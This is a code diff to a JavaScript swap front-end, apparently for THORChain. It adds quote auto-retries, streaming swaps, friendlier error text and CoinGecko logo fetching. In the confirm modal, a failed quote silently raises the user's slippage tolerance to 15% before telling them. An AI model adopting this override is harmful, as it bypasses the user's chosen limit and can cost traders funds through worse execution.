-    var url=buildQuoteUrl(dest);
+/* FIX 2: fetchQuoteWithDest now accepts overrides */
+function fetchQuoteWithDest(dest,cb,overrides){
+    var url=buildQuoteUrl(dest,overrides);
     fetch(url).then(function(r){
         var s=r.status;
         return r.json().then(function(d){d._httpStatus=s;return d});
@@ -600,7 +720,7 @@ function debounce(fn,d){var t;return function(){clearTimeout(t);t=setTimeout(fn,
 var debouncedFetchQuote=debounce(function(){fetchQuote();startCountdown()},500);
 
 // ══════════════════════════════════════════
-// COIN SELECTOR - UPDATED FOR ALL CHAINS
+// COIN SELECTOR
 // ══════════════════════════════════════════
 
 function openCoinSelector(side){
@@ -617,8 +737,7 @@ function renderCoinTokens(chain,search){
     var list=$('#coinTokensList');if(!list)return;
     var cv=state.coinSelectSide==='sell'?state.sellAsset:state.buyAsset;
     var f=TOKEN_LIST.filter(function(t){
-        // Filter by status (available or staged)
-        if(t.status==='staged'&&chain==='all')return false; // Hide staged tokens in "All Chains" view
+        if(t.status==='staged'&&chain==='all')return false;
         if(chain!=='all'&&t.chain!==chain)return false;
         if(search){
             var s=search.toLowerCase();
@@ -633,8 +752,11 @@ function renderCoinTokens(chain,search){
         var sel=t.value===cv;
         var netLabel=t.network||t.name;
         var statusBadge=t.status==='staged'?'<span style="font-size:9px;padding:2px 6px;background:var(--andy);color:var(--tyler);border-radius:4px;margin-left:6px;">STAGED</span>':'';
+        var iconHtml=t.icon
+            ?'<img src="'+t.icon+'" alt="" onerror="this.style.display=\'none\'">'
+            :'<div style="width:32px;height:32px;border-radius:50%;background:var(--blade);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:var(--thor-gray);">'+t.symbol.substring(0,2)+'</div>';
         h+='<div class="tc-coin-token-item'+(sel?' selected':'')+'" data-value="'+t.value+'">'
-            +'<div class="tc-coin-token-left"><img src="'+t.icon+'" alt="" onerror="this.style.display=\'none\'"><div>'
+            +'<div class="tc-coin-token-left">'+iconHtml+'<div>'
             +'<div class="tc-coin-token-sym">'+t.symbol+statusBadge+'</div><div class="tc-coin-token-chain">'+netLabel+'</div></div></div>'
             +(sel?'<span class="tc-coin-token-selected">Selected</span>':'')+'</div>';
     });
@@ -650,13 +772,15 @@ function selectCoin(v){
     $('#coinSelectOverlay').classList.remove('open');
     if(state.coinSelectSide==='sell'){
         state.sellAsset=v;
-        var si=$('#sellIcon');if(si)si.src=t.icon;
+        var si=$('#sellIcon');
+        if(si){if(t.icon)si.src=t.icon;else si.style.display='none'}
         var ss=$('#sellSymbol');if(ss)ss.textContent=t.symbol;
         var sn=$('#sellName');if(sn)sn.textContent=t.name;
         updateSellUsd();
     }else{
         state.buyAsset=v;
-        var bi=$('#buyIcon');if(bi)bi.src=t.icon;
+        var bi=$('#buyIcon');
+        if(bi){if(t.icon)bi.src=t.icon;else bi.style.display='none'}
         var bs=$('#buySymbolDisplay');if(bs)bs.textContent=t.symbol;
         var bn=$('#buyNameDisplay');if(bn)bn.textContent=t.name;
     }
@@ -818,38 +942,127 @@ function openAddressModal(){
     };
 }
 
-function openConfirmModal(){
+/* ═══════════════════════════════════════════════════════════════════════════
+   FIX 2+3+4+5: openConfirmModal — Auto-retry, streaming, clean errors
+   ═══════════════════════════════════════════════════════════════════════════ */
+function openConfirmModal(retryConfig){
+    retryConfig=retryConfig||{};
+    var attempt=retryConfig.attempt||0;
+    var toleranceBps=retryConfig.toleranceBps||slippageToBps();
+    var useStreaming=(retryConfig.streaming!==undefined)?retryConfig.streaming:state.streamingEnabled;
+
     var o=$('#confirmOverlay'),b=$('#confirmBody');
+
+    /* Show loading spinner */
+    var loadMsg=attempt>0
+        ?'Adjusting parameters and retrying... (attempt '+(attempt+1)+')'
+        :'Fetching swap quote...';
     b.innerHTML='<div style="text-align:center;padding:40px 0;">'
         +'<span class="tc-btn-spinner" style="border-color:var(--blade);border-top-color:var(--brand-first);width:28px;height:28px;"></span>'
-        +'<p style="margin-top:12px;font-size:13px;color:var(--thor-gray);">Fetching swap quote...</p></div>';
+        +'<p style="margin-top:12px;font-size:13px;color:var(--thor-gray);">'+loadMsg+'</p></div>';
     o.classList.add('open');
+
     $('#confirmClose').onclick=function(){o.classList.remove('open')};
     o.onclick=function(e){if(e.target===o)o.classList.remove('open')};
 
+    /* FIX 4: Pool depth warning in confirm modal */
+    if(attempt===0&&checkPoolDepthWarning()){
+        showToast('warning','Large Trade',
+            'This trade is large relative to pool depth. Price impact may be significant.',6000);
+    }
+
     fetchQuoteWithDest(state.recipientAddress,function(err,data){
+
+        /* ─── Network error (no response at all) ─── */
         if(err&&!data){
-            b.innerHTML='<p style="text-align:center;padding:30px;color:var(--leah);">Network error.</p>'
-                +'<button class="tc-confirm-btn" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
+            b.innerHTML='<div style="text-align:center;padding:30px 0;">'
+                +'<p style="font-size:48px;margin-bottom:12px;">🌐</p>'
+                +'<p style="color:var(--leah);font-size:15px;font-weight:600;margin-bottom:8px;">Network Error</p>'
+                +'<p style="color:var(--thor-gray);font-size:13px;">Unable to reach THORChain. Please check your connection and try again.</p></div>'
+                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);margin-top:16px;" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
             return;
         }
+
+        /* ─── Quote failed ─── */
         if(!isValidQuote(data)){
-            var em=getQuoteError(data);
-            var isSE=data&&data.message&&data.message.indexOf('less than price limit')!==-1;
-            var rh=isSE?'<div style="margin-top:16px;display:flex;gap:8px;justify-content:center;">'
-                +'<button class="tc-quick-btn" id="retryS7" style="background:var(--brand-first);color:var(--lawrence)">Try 7%</button>'
-                +'<button class="tc-quick-btn" id="retryS10">Try 10%</button></div>':'';
+            var rawMsg=((data&&data.message)||'').toLowerCase();
+            var isPriceLimit=rawMsg.indexOf('price limit')!==-1;
+
+            /* FIX 2: Auto-retry at 15% on slippage failure */
+            if(isPriceLimit&&attempt===0){
+                console.log('⚡ Confirm: slippage failure — auto-retrying at 15%...');
+                openConfirmModal({attempt:1,toleranceBps:1500,streaming:useStreaming});
+                return;
+            }
+
+            /* FIX 3: Auto-retry with streaming if still failing */
+            if(isPriceLimit&&attempt===1&&!useStreaming){
+                console.log('⚡ Confirm: still failing — retrying with streaming...');
+                openConfirmModal({attempt:2,toleranceBps:1500,streaming:true});
+                return;
+            }
+
+            /* FIX 5: All retries exhausted — show clean, friendly error */
+            var friendlyMsg=isPriceLimit
+                ?'Swap size too large for current liquidity. Try reducing the amount.'
+                :mapErrorMessage(data);
+
             b.innerHTML='<div style="text-align:center;padding:24px 0;">'
                 +'<p style="font-size:48px;margin-bottom:12px;">⚠️</p>'
-                +'<p style="color:var(--leah);font-size:15px;font-weight:600;margin-bottom:8px;">Quote Failed</p>'
-                +'<p style="color:var(--thor-gray);font-size:13px;line-height:1.5;padding:0 12px;">'+em+'</p>'+rh+'</div>'
+                +'<p style="color:var(--leah);font-size:15px;font-weight:600;margin-bottom:8px;">Quote Unavailable</p>'
+                +'<p style="color:var(--thor-gray);font-size:13px;line-height:1.6;padding:0 12px;">'+friendlyMsg+'</p>'
+
+                /* Helpful action buttons instead of raw retry */
+                +'<div style="margin-top:20px;display:flex;gap:8px;justify-content:center;flex-wrap:wrap;">'
+                +'<button class="tc-quick-btn" id="confirmReduceHalf" style="background:var(--brand-first);color:var(--lawrence);padding:8px 16px;border-radius:8px;cursor:pointer;">Try Half Amount</button>'
+                +'<button class="tc-quick-btn" id="confirmRetryStreaming" style="padding:8px 16px;border-radius:8px;cursor:pointer;">Try with Streaming</button>'
+                +'</div></div>'
+
                 +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);margin-top:16px;" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
-            if(isSE)setTimeout(function(){
-                var r7=$('#retryS7');if(r7)r7.onclick=function(){state.slippage=7;o.classList.remove('open');openConfirmModal()};
-                var r10=$('#retryS10');if(r10)r10.onclick=function(){state.slippage=10;o.classList.remove('open');openConfirmModal()};
+
+            /* Wire up action buttons */
+            setTimeout(function(){
+                var rh=$('#confirmReduceHalf');
+                if(rh)rh.onclick=function(){
+                    state.sellAmount=state.sellAmount/2;
+                    var si=$('#sellAmount');if(si)si.value=state.sellAmount;
+                    updateSellUsd();
+                    openConfirmModal({attempt:0});
+                };
+                var rs=$('#confirmRetryStreaming');
+                if(rs)rs.onclick=function(){
+                    state.streamingEnabled=true;
+                    var st=$('#streamingToggle');if(st)st.checked=true;
+                    openConfirmModal({attempt:0,streaming:true});
+                };
             },50);
-            showToast('error','Quote Failed',em,7000);
+
+            showToast('error','Quote Unavailable',friendlyMsg,7000);
             return;
+        }
+
+        /* ═══ QUOTE SUCCEEDED ═══ */
+
+        /* FIX 2: Track effective slippage */
+        state.effectiveSlippage=(toleranceBps/100);
+        if(attempt>0){
+            console.log('✅ Confirm quote succeeded on retry attempt '+attempt+' at '+(toleranceBps/100)+'% slippage');
+            showToast('info','Auto-Adjusted',
+                'Slippage was automatically increased to '+(toleranceBps/100)+'% for this trade size.',5000);
+        }
+
+        /* FIX 3: Note if streaming was auto-enabled */
+        if(useStreaming&&!state.streamingEnabled){
+            state.streamingEnabled=true;
+            var stToggle=$('#streamingToggle');if(stToggle)stToggle.checked=true;
+            showToast('info','Streaming Enabled',
+                'Streaming mode was automatically enabled for better execution.',4000);
+        }
+
+        /* FIX 3: Check if response recommends streaming for future */
+        if(shouldAutoEnableStreaming(data)&&!state.streamingEnabled){
+            state.streamingEnabled=true;
+            var stToggle2=$('#streamingToggle');if(stToggle2)stToggle2.checked=true;
         }
 
         var eo=parseExpectedOut(data);
@@ -864,13 +1077,23 @@ function openConfirmModal(){
         var su=state.sellAmount*sp;
         var bu=eo*bp;
 
-        var mp=eo*(1-state.slippage/100);
+        /* FIX 2: Use effectiveSlippage for minimum payout calculation */
+        var effectiveSlip=state.effectiveSlippage;
+        var mp=eo*(1-effectiveSlip/100);
         var mpu=mp*bp;
 
         var fees=parseFees(data);
         var ts=parseSwapTime(data);
         var memo=data.memo||'';
         var ia=data.inbound_address||'';
+
+        /* FIX 3: Show streaming badge if streaming is active */
+        var streamingBadge='';
+        if(useStreaming||state.streamingEnabled){
+            streamingBadge='<div style="display:inline-flex;align-items:center;gap:4px;padding:3px 10px;'
+                +'background:rgba(0,212,200,0.1);border:1px solid rgba(0,212,200,0.3);border-radius:6px;'
+                +'font-size:11px;color:#00d4c8;margin-top:8px;">🌊 Streaming Swap</div>';
+        }
 
         var h='<div class="tc-confirm-pair">'
             +'<div class="tc-confirm-asset">'
@@ -887,12 +1110,14 @@ function openConfirmModal(){
             +'<div><div class="tc-confirm-asset-sym">'+bs+'</div><div class="tc-confirm-asset-name">'+bn+'</div></div></div>'
             +'<div class="tc-confirm-asset-right">'
             +'<div class="tc-confirm-asset-amount">'+formatAmount(eo,8)+'</div>'
-            +'<div class="tc-confirm-asset-usd">'+formatUsd(bu)+'</div></div></div></div>'
+            +'<div class="tc-confirm-asset-usd">'+formatUsd(bu)+'</div></div></div>'
+            +streamingBadge
+            +'</div>'
 
             +'<div class="tc-confirm-details">'
 
             +'<div class="tc-confirm-row">'
-            +'<span class="tc-confirm-row-label">Minimum Payout ('+state.slippage+'%)</span>'
+            +'<span class="tc-confirm-row-label">Minimum Payout ('+effectiveSlip+'%)</span>'
             +'<span class="tc-confirm-row-value">'+formatAmount(mp,4)+' '+bs+' ('+formatUsd(mpu)+')</span></div>'
 
             +'<div class="tc-confirm-row">'
@@ -926,7 +1151,8 @@ function openConfirmModal(){
         if(ia){
             h+='<button class="tc-confirm-btn" id="doConfirmBtn">Confirm</button>';
         }else{
-            h+='<div style="padding:12px;background:var(--toast-error-bg);border:1px solid var(--toast-error-border);border-radius:10px;margin-bottom:16px;font-size:13px;color:var(--toast-error-color);">⚠️ No vault address.</div>'
+            /* FIX 5: Friendly no-vault message */
+            h+='<div style="padding:12px;background:var(--toast-error-bg);border:1px solid var(--toast-error-border);border-radius:10px;margin-bottom:16px;font-size:13px;color:var(--toast-error-color);">⚠️ Vault temporarily unavailable. Please try again in a few moments.</div>'
                 +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
         }
 
@@ -935,7 +1161,8 @@ function openConfirmModal(){
         state.confirmedExpectedOut=eo;
         var cb=$('#doConfirmBtn');
         if(cb)cb.onclick=function(){o.classList.remove('open');openSendModal(data)};
-    });
+
+    },{toleranceBps:toleranceBps,streaming:useStreaming});
 }
 
 function openSendModal(qd){
@@ -1131,6 +1358,8 @@ function initSettings(){
         slider.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+ip+'%,var(--blade) '+ip+'%,var(--blade) 100%)';
         slider.oninput=function(){
             state.slippage=parseFloat(this.value);
+            /* FIX 2: Also update effective slippage when user manually changes */
+            state.effectiveSlippage=state.slippage;
             if(display)display.textContent=parseFloat(this.value).toFixed(1)+'%';
             var pct=((this.value-this.min)/(this.max-this.min))*100;
             this.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+pct+'%,var(--blade) '+pct+'%,var(--blade) 100%)';
@@ -1144,7 +1373,9 @@ function initSettings(){
 
     var rst=$('#settingsReset');
     if(rst)rst.onclick=function(){
+        /* FIX 1: Reset now uses 10% default */
         state.slippage=DEFAULT_SLIPPAGE;
+        state.effectiveSlippage=DEFAULT_SLIPPAGE;
         state.streamingEnabled=false;
         if(slider){slider.value=DEFAULT_SLIPPAGE;slider.dispatchEvent(new Event('input'))}
         if(st)st.checked=false;
@@ -1184,6 +1415,122 @@ function initCountdownClick(){
 }
 
 // ══════════════════════════════════════════
+// LOGO FIXER — API fetch for specific coins
+// ══════════════════════════════════════════
+
+function fetchLogosViaAPI(){
+    /* Step 1: Set THORChain native logos immediately (no API needed) */
+    TOKEN_LIST.forEach(function(t){
+        if(THOR_NATIVE_LOGOS[t.symbol]){
+            t.icon=THOR_NATIVE_LOGOS[t.symbol];
+        }
+    });
+
+    /* Step 2: Build CoinGecko IDs string for batch fetch */
+    var ids=Object.values(COINGECKO_ID_MAP).join(',');
+
+    /* Step 3: Single batch request to CoinGecko markets endpoint */
+    fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids='+ids+'&order=market_cap_desc&per_page=50&page=1&sparkline=false')
+        .then(function(r){
+            if(!r.ok)throw new Error('CoinGecko HTTP '+r.status);
+            return r.json();
+        })
+        .then(function(data){
+            if(!Array.isArray(data))return;
+
+            /* Step 4: Build a lookup map from coinGecko id → image url */
+            var idToImage={};
+            data.forEach(function(coin){
+                if(coin.id&&coin.image){
+                    idToImage[coin.id]=coin.image;
+                }
+            });
+
+            /* Step 5: Update TOKEN_LIST entries that need fixing */
+            TOKEN_LIST.forEach(function(token){
+                var geckoId=COINGECKO_ID_MAP[token.symbol];
+                if(geckoId&&idToImage[geckoId]){
+                    token.icon=idToImage[geckoId];
+                }
+            });
+
+            /* Step 6: Also update CHAIN_INFO logo for LTC and RUNE */
+            if(idToImage['litecoin'])CHAIN_INFO['LTC'].logo=idToImage['litecoin'];
+            if(idToImage['thorchain'])CHAIN_INFO['THOR'].logo=idToImage['thorchain'];
+
+            /* Step 7: Refresh any open dropdowns with new icons */
+            refreshVisibleIcons();
+
+            console.log('✅ Logos fetched from CoinGecko for: '+Object.keys(COINGECKO_ID_MAP).join(', '));
+        })
+        .catch(function(err){
+            console.warn('⚠️ CoinGecko logo fetch failed, trying one-by-one fallback:', err);
+            fetchLogosOneByOne();
+        });
+}
+
+/* Fallback: fetch logos one by one if batch fails (e.g. rate limit) */
+function fetchLogosOneByOne(){
+    var symbols=Object.keys(COINGECKO_ID_MAP);
+    var delay=0;
+    symbols.forEach(function(sym){
+        var geckoId=COINGECKO_ID_MAP[sym];
+        setTimeout(function(){
+            fetch('https://api.coingecko.com/api/v3/coins/'+geckoId+'?localization=false&tickers=false&market_data=false&community_data=false&developer_data=false')
+                .then(function(r){return r.json()})
+                .then(function(coin){
+                    var img=coin.image&&(coin.image.small||coin.image.thumb||coin.image.large);
+                    if(img){
+                        TOKEN_LIST.forEach(function(t){
+                            if(t.symbol===sym){t.icon=img}
+                        });
+                        if(sym==='LTC')CHAIN_INFO['LTC'].logo=img;
+                        if(sym==='RUNE')CHAIN_INFO['THOR'].logo=img;
+                        refreshVisibleIcons();
+                        console.log('✅ Logo fetched for '+sym+': '+img);
+                    }
+                })
+                .catch(function(){console.warn('❌ Could not fetch logo for '+sym)});
+        },delay);
+        delay+=300; /* Stagger requests by 300ms to avoid rate limit */
+    });
+}
+
+/* Update any visible coin icons that are already rendered on screen */
+function refreshVisibleIcons(){
+    /* Update sell token icon if visible */
+    var sellToken=getTokenInfo(state.sellAsset);
+    if(sellToken&&sellToken.icon){
+        var si=$('#sellIcon');
+        if(si){si.src=sellToken.icon;si.style.display=''}
+    }
+
+    /* Update buy token icon if visible */
+    var buyToken=getTokenInfo(state.buyAsset);
+    if(buyToken&&buyToken.icon){
+        var bi=$('#buyIcon');
+        if(bi){bi.src=buyToken.icon;bi.style.display=''}
+    }
+
+    /* Update limit view icons */
+    var lsi=$('#limitSellIcon');
+    if(lsi&&sellToken&&sellToken.icon)lsi.src=sellToken.icon;
+    var lbi=$('#limitBuyIcon');
+    if(lbi&&buyToken&&buyToken.icon)lbi.src=buyToken.icon;
+    var lri=$('#limitRateIcon');
+    if(lri&&sellToken&&sellToken.icon)lri.src=sellToken.icon;
+
+    /* If coin dropdown is open, re-render it with new icons */
+    var overlay=$('#coinSelectOverlay');
+    if(overlay&&overlay.classList.contains('open')){
+        var ac=$('.tc-coin-chain-item.active');
+        var chain=ac?ac.getAttribute('data-chain'):'all';
+        var search=($('#coinSearchInput')||{}).value||'';
+        renderCoinTokens(chain,search);
+    }
+}
+
+// ══════════════════════════════════════════
 // MAIN INIT
 // ══════════════════════════════════════════
 
@@ -1192,7 +1539,16 @@ function init(){
     initFlipArrow();initQuickBtns();initSettings();initModals();initSwapBtn();
     initCountdownClick();initLimitOrder();
     if(state.history.some(function(h){return h.status==='pending'})){var d=$('#historyDot');if(d)d.style.display=''}
-    fetchPools().then(function(){fetchQuote();startCountdown()});
+
+    /* Fetch pools first, then quote, then logos in parallel */
+    fetchPools().then(function(){
+        fetchQuote();
+        startCountdown();
+    });
+
+    /* Fetch logos via API — runs in background, won't block anything */
+    fetchLogosViaAPI();
+
     setInterval(fetchPools,60000);
 }
 
